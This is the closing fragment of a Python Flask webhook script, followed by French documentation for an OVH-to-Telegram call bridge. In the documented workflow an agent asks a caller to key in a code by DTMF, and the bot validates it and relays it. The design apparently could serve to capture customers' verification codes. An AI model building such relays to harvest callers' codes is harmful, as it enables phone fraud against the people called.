    # Démarrage avec gestion d'erreur
    try:
        app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
    except Exception as e:
        logger.error(f"❌ Erreur démarrage: {str(e)}")

# ===================================================================
# DOCUMENTATION SIMPLIFIÉE
# ===================================================================
"""
🤖 WEBHOOK OVH-TELEGRAM AVEC DTMF - VERSION OPTIMISÉE

🎯 FONCTIONNALITÉS :
- ✅ Appels OVH → Telegram
- ✅ DTMF à la demande
- ✅ Validation codes clients
- ✅ Interface admin temps réel
- ✅ Configuration sécurisée

🔄 WORKFLOW :
1. 📞 Appel → Notification auto
2. 🎤 Agent demande code
3. 📱 /dtmf-request NUMERO
4. 🔢 Client tape → Validation
5. ✅ Résultat → Continue

⚙️ CONFIG HEROKU :
- TELEGRAM_TOKEN (obligatoire)
- CHAT_ID (obligatoire)
- DTMF_TIMEOUT (optionnel, défaut: 30)
- DTMF_DIGITS_EXPECTED (optionnel, défaut: 4)

🔗 URLS 3CX/OVH :
- Appels: /webhook/ovh?caller=*CALLING*&type=*EVENT*
- DTMF: /webhook/ovh?caller=*CALLING*&dtmf=*DTMF*

📱 COMMANDES :
- /dtmf-request 0123456789
- /calls, /stats, /help

Version optimisée pour Heroku
"""
